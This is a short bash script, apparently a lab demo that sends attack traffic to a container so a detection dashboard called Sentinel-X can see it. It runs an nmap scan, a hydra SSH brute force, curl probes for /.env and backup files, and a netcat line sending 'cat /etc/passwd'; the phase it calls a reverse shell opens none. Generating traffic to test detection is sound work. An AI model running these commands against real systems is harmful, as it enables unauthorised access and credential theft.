#!/bin/bash
# Sentinel-X v3.0 Attack Orchestrator
# Sequences real attacks against the target container

TARGET_IP="172.20.0.3"  # Standard IP in the lab_network subnet

echo "🚀 SENTINEL-X ATTACK ORCHESTRATOR"
echo "================================="
echo "Target IP: $TARGET_IP"
echo ""

# PHASE 1: RECONNAISSANCE
echo "[*] PHASE 1: Port Reconnaissance (nmap)..."
nmap -sV -p 22,80,443 --open $TARGET_IP
sleep 3

# PHASE 2: BRUTE FORCE
echo "[*] PHASE 2: SSH Brute Force (hydra)..."
# Using a small common password list for speed in demo
echo "password\n123456\nadmin\nroot\nqwerty" > /tmp/passwords.txt
hydra -l admin -P /tmp/passwords.txt -t 4 ssh://$TARGET_IP
sleep 3

# PHASE 3: WEB PROBE
echo "[*] PHASE 3: Web Application Probing (curl)..."
for path in /admin /config.php /.env /wp-login.php /backup.zip; do
    echo "  -> Probing $path"
    curl -s -o /dev/null -w "%{http_code}" http://$TARGET_IP$path
    echo ""
    sleep 1
done

# PHASE 4: COMMAND INJECTION / SHELL (Simulated via port interact)
echo "[*] PHASE 4: Simulated Reverse Shell (netcat)..."
echo "id; whoami; cat /etc/passwd" | nc -w 2 $TARGET_IP 22
echo ""

echo "================================="
echo "✅ Attack sequence complete. Check the Sentinel-X Dashboard!"
